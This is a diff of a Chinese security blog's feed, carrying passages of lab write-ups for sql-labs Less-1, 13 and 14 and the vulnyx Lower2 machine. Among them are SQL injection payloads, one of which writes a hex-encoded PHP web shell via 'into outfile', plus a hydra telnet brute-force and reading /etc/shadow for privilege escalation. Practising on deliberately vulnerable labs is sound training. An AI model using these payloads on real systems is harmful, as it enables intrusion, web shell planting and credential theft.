-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141135.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250324141135&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141135.png&#34; alt=&#34;Pasted image 20250324141135&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1186,26 +715,8 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;进行测试，发现可知查询结果有两列&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141332.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250324141332&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141349.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250324141349&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141332.png&#34; alt=&#34;Pasted image 20250324141332&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141349.png&#34; alt=&#34;Pasted image 20250324141349&#34;&gt;&lt;br&gt;
 使用union进行查询，发现没有回显。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1215,16 +726,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141550.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250324141550&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141550.png&#34; alt=&#34;Pasted image 20250324141550&#34;&gt;&lt;br&gt;
 看来这关要用报错注入了&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1269,18 +771,9 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uname=ele&amp;#39;) or 1=1 limit 0,1 into outfile &amp;#39;C:/less13.php&amp;#39; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c65737331335d293b3f3e#&amp;amp;passwd=pass&amp;amp;submit=Submit
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141817.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250324141817&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-14&#34;&gt;Less-14
-&lt;/h1&gt;&lt;p&gt;这关回显sql语法错误，并且闭合是&amp;quot;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141817.png&#34; alt=&#34;Pasted image 20250324141817&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-14&#34;&gt;Less-14&lt;/h1&gt;
+&lt;p&gt;这关回显sql语法错误，并且闭合是&amp;quot;&lt;br&gt;
 测试&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1290,16 +783,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uname=admin&amp;#34;&amp;amp;passwd=pass&amp;amp;submit=Submit
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324142325.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250324142325&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324142325.png&#34; alt=&#34;Pasted image 20250324142325&#34;&gt;&lt;br&gt;
 和上一关一样，这关如果sql查询有值也不显示，所以还是用报错注入，图就不截了，和上一关差不多，跨库爆数据的所有payload如下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1353,28 +837,19 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
         <pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAvulnyx%E9%9D%B6%E5%9C%BA-lower2/</guid>
-        <description>&lt;img src="http://localhost:1313/images/23.webp" alt="Featured image of post 【靶场】vulnyx靶场-Lower2" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介
-&lt;/h1&gt;&lt;p&gt;vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。&lt;/p&gt;
-&lt;h1 id=&#34;部署方法&#34;&gt;&lt;strong&gt;部署方法&lt;/strong&gt;
-&lt;/h1&gt;&lt;p&gt;官网：https://vulnyx.com/&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/23.webp" alt="Featured image of post 【靶场】vulnyx靶场-Lower2" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
+&lt;p&gt;vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。&lt;/p&gt;
+&lt;h1 id=&#34;部署方法&#34;&gt;&lt;strong&gt;部署方法&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;官网：https://vulnyx.com/&lt;br&gt;
 1.在官网搜索你想要的镜像,然后下载&lt;br&gt;
 2.下载好后解压得到&lt;code&gt;.ova&lt;/code&gt;的文件，右击选择VMware进行打开&lt;br&gt;
 3.在弹出的框中，选择存放的位置，然后点击导入&lt;br&gt;
 4.最后等待导入完成，然后启动该虚拟机就可以了&lt;br&gt;
 &lt;strong&gt;部署成功&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307124829.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307124829&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;步骤&#34;&gt;步骤
-&lt;/h1&gt;&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
-&lt;/h2&gt;&lt;p&gt;这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307124829.png&#34; alt=&#34;Pasted image 20250307124829&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;步骤&#34;&gt;步骤&lt;/h1&gt;
+&lt;h2 id=&#34;信息收集&#34;&gt;信息收集&lt;/h2&gt;
+&lt;p&gt;这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1385,26 +860,8 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap 192.168.30.45 -A -O -p 1-65535
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125229.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307125229&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125239.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307125239&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125229.png&#34; alt=&#34;Pasted image 20250307125229&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125239.png&#34; alt=&#34;Pasted image 20250307125239&#34;&gt;&lt;br&gt;
 这边使用fscan和nmap都扫描了一边发现开放了三个端口：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1420,16 +877,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;这里进行尝试连接一下ssh，发现给出了一个账户：&lt;strong&gt;b.taylor&lt;/strong&gt;&lt;br&gt;
 22端口是不能爆破的。登录了一下发现是拒绝的。那就只能爆破23端口了。&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125456.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307125456&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125456.png&#34; alt=&#34;Pasted image 20250307125456&#34;&gt;&lt;br&gt;
 使用hydra进行爆破&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1443,30 +891,12 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l b.taylor -P /root/Desktop/Tools/rockyou.txt telnet://192.168.198.137 -V -I
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307130820.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307130820&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307130820.png&#34; alt=&#34;Pasted image 20250307130820&#34;&gt;&lt;br&gt;
 账号密码：b.taylor/rockyou&lt;br&gt;
 使用telnet进行登录即可：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131333.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307131333&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user&#34;&gt;user
-&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131333.png&#34; alt=&#34;Pasted image 20250307131333&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user&#34;&gt;user&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -1474,18 +904,9 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ZWRjOWY1YzU1YWY4NzUwNTAzM2EyMGRkNDE5MzEzNjQK
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131600.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307131600&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h2 id=&#34;shadow提权&#34;&gt;shadow提权
-&lt;/h2&gt;&lt;p&gt;发现这个用户附加了shadow组&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131600.png&#34; alt=&#34;Pasted image 20250307131600&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;shadow提权&#34;&gt;shadow提权&lt;/h2&gt;
+&lt;p&gt;发现这个用户附加了shadow组&lt;br&gt;
 可以查看一下权限&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1497,16 +918,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/shadow
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131746.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250307131746&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131746.png&#34; alt=&#34;Pasted image 20250307131746&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1526,19 +938,10 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
         <pubDate>Fri, 29 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less1-5/</guid>
-        <description>&lt;img src="http://localhost:1313/images/19.webp" alt="Featured image of post 【靶场】sql-labs-Less1-5" /&gt;&lt;h1 id=&#34;less-1&#34;&gt;Less-1
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39; &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/19.webp" alt="Featured image of post 【靶场】sql-labs-Less1-5" /&gt;&lt;h1 id=&#34;less-1&#34;&gt;Less-1&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39; &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
 1.进入第一题，显示&lt;code&gt;Please input the ID as parameter with numeric value&lt;/code&gt;，告诉了我们参数为&lt;code&gt;id&lt;/code&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160458.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313160458&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160458.png&#34; alt=&#34;Pasted image 20250313160458&#34;&gt;&lt;br&gt;
 2.构造&lt;code&gt;?id=1&lt;/code&gt;,页面显示正常&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1548,16 +951,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160541.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313160541&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160541.png&#34; alt=&#34;Pasted image 20250313160541&#34;&gt;&lt;br&gt;
 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1567,16 +961,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160614.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313160614&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160614.png&#34; alt=&#34;Pasted image 20250313160614&#34;&gt;&lt;br&gt;
 4.构造&lt;code&gt;?id=1&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;页面重新显示正常，由此判断出这题是&lt;strong&gt;单引号字符型注入&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1586,16 +971,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160735.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313160735&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160735.png&#34; alt=&#34;Pasted image 20250313160735&#34;&gt;&lt;br&gt;
 5.构造&lt;code&gt;?id=1&#39; order by 1 --+&lt;/code&gt;通过order by子句来判断该数据表的字段数，页面显示正常。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1605,16 +981,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
